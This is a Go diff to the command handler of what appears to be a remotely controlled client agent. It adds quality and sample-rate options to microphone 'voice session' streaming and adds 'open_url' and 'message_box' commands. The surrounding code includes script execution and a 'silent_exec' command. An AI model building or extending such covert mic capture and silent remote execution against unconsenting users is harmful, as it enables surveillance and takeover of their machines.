@@ -432,7 +432,7 @@ func stopVoiceSession() {
 	}
 }
 
-func startVoiceSession(ctx context.Context, env *runtime.Env, sessionID string, source string) error {
+func startVoiceSession(ctx context.Context, env *runtime.Env, sessionID string, source string, quality string, sampleRate int) error {
 	if sessionID == "" {
 		return errors.New("missing voice session id")
 	}
@@ -440,7 +440,7 @@ func startVoiceSession(ctx context.Context, env *runtime.Env, sessionID string, 
 	stopVoiceSession()
 
 	vCtx, cancel := context.WithCancel(ctx)
-	session, err := audio.StartVoiceSession(vCtx, source, func(chunk []byte) {
+	session, err := audio.StartVoiceSessionWithQuality(vCtx, source, quality, sampleRate, func(chunk []byte) {
 		if len(chunk) == 0 {
 			return
 		}
@@ -455,6 +455,16 @@ func startVoiceSession(ctx context.Context, env *runtime.Env, sessionID string, 
 		cancel()
 		return err
 	}
+
+	// Announce actual capture format so viewers can decode correctly.
+	_ = wire.WriteMsg(vCtx, env.Conn, map[string]interface{}{
+		"type":       "voice_uplink",
+		"sessionId":  sessionID,
+		"info":       true,
+		"format":     true,
+		"sampleRate": session.SampleRate(),
+		"quality":    session.Quality(),
+	})
 
 	v := &voiceRuntime{sessionID: sessionID, cancel: cancel, session: session}
 	voiceSessionMu.Lock()
@@ -2500,13 +2510,28 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "voice_session_start":
 		sessionID, _ := envelopePayloadString(envelope, "sessionId")
 		source := "default"
+		quality := "balanced"
+		sampleRate := 0
 		payload, _ := envelope["payload"].(map[string]interface{})
 		if payload != nil {
 			if v, ok := payload["source"].(string); ok && strings.TrimSpace(v) != "" {
 				source = strings.TrimSpace(v)
 			}
+			if v, ok := payload["quality"].(string); ok && strings.TrimSpace(v) != "" {
+				quality = strings.TrimSpace(v)
+			}
+			switch n := payload["sampleRate"].(type) {
+			case int:
+				sampleRate = n
+			case int64:
+				sampleRate = int(n)
+			case float64:
+				sampleRate = int(n)
+			case uint64:
+				sampleRate = int(n)
+			}
 		}
-		if err := startVoiceSession(ctx, env, sessionID, source); err != nil {
+		if err := startVoiceSession(ctx, env, sessionID, source, quality, sampleRate); err != nil {
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
 		}
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
@@ -2901,6 +2926,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		StartScriptExecute(ctx, env, cmdID, scriptContent, scriptType)
 		return nil
+	case "open_url":
+		payload := payloadAsMap(envelope["payload"])
+		return handleOpenURL(ctx, env, cmdID, payload)
+	case "message_box":
+		payload := payloadAsMap(envelope["payload"])
+		return handleMessageBox(ctx, env, cmdID, payload)
 	case "silent_exec":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		if payload == nil {
